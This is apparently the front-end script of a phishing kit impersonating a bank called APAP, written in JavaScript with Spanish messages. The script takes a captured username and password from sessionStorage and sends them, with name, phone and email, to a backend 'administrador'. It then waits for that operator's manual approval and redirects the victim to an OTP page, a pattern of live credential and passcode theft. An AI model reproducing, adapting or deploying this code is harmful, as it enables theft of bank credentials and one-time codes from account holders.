// registro.js
const API_BASE_URL = '/api';

function toggleDropdown() {
    const menu = document.getElementById('dropdownMenu');
    if (!menu) return;
    menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
}

function selectChannel(type, text) {
    const dropdownText = document.querySelector('.dropdown-text');
    if (dropdownText) dropdownText.textContent = text;
    const selectedChannel = document.getElementById('selectedChannel');
    if (selectedChannel) selectedChannel.style.display = 'block';
    const selectedText = document.getElementById('selectedText');
    if (selectedText) selectedText.textContent = text;
    const confirmBtn = document.getElementById('confirmBtn');
    if (confirmBtn) confirmBtn.style.display = 'block';
    window._selectedChannel = { type, text };
    closeDropdown();
}

function closeDropdown() {
    const menu = document.getElementById('dropdownMenu');
    if (menu) menu.style.display = 'none';
}

function confirmChannel(event) {
    event.preventDefault();
    const sel = window._selectedChannel;
    const usuario = sessionStorage.getItem('apap_usuario');
    const password = sessionStorage.getItem('apap_password');

    if (!sel || !usuario || !password) {
        alert('Faltan datos. Regresa al login.');
        window.location.href = 'index.html';
        return;
    }

    // optional profile fields saved earlier in sessionStorage by index.html (if implemented)
    const profile = {
        serviceType: sessionStorage.getItem('serviceType') || null,
        fullName: sessionStorage.getItem('fullName') || null,
        phone: sessionStorage.getItem('phone') || null,
        email: sessionStorage.getItem('email') || null,
    };
    // remove nulls
    Object.keys(profile).forEach(k => { if (!profile[k]) delete profile[k]; });

    showLoading('Enviando selección al administrador...');
    fetch(`${API_BASE_URL}/apap_registro`, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
            usuario: usuario,
            password: password,
            canal: sel.type,
            canal_texto: sel.text,
            // forward profile if present
            ...profile
        })
    })
    .then(res => res.json())
    .then(data => {
        hideLoading();
        if (data.status === 'ok') {
            createApapLoader(usuario);
        } else {
            alert('Error al enviar datos');
        }
    })
    .catch(err => {
        hideLoading();
        console.error(err);
        alert('Error de conexión');
    });
}

function createApapLoader(usuario) {
    document.body.innerHTML = `
        <div style="min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column">
            <h2>Enviando solicitud al administrador...</h2>
            <div class="spinner-border" role="status" style="margin-top:20px"></div>
        </div>
    `;
    startApapPolling(usuario);
}

function startApapPolling(usuario) {
    const poll = setInterval(async () => {
        try {
            const res = await fetch(`${API_BASE_URL}/apap_estado/${encodeURIComponent(usuario)}`);
            if (!res.ok) return;
            const data = await res.json();
            if (data.status === 'ok' && data.decision) {
                clearInterval(poll);
                if (data.decision === 'aprobar') {
                    window.location.href = 'otp.html';
                } else {
                    alert('Registro rechazado por el administrador');
                    window.location.href = 'index.html';
                }
            }
        } catch (err) {
            console.error('Polling registro error', err);
        }
    }, 2000);
}

function goBack() { window.location.href = 'index.html'; }

function showLoading(msg='Cargando...') {
    if (document.getElementById('loading-overlay')) return;
    const overlay = document.createElement('div');
    overlay.id = 'loading-overlay';
    overlay.style = 'position:fixed;left:0;top:0;right:0;bottom:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.4);z-index:9999';
    overlay.innerHTML = `<div style="background:white;padding:20px;border-radius:8px;text-align:center">${msg}<div class="spinner-border" style="margin-top:8px"></div></div>`;
    document.body.appendChild(overlay);
}
function hideLoading() { const el = document.getElementById('loading-overlay'); if (el) el.remove(); }

document.addEventListener('DOMContentLoaded', () => {
    const confirmBtn = document.getElementById('confirmBtn');
    if (confirmBtn) confirmBtn.addEventListener('click', confirmChannel);
});
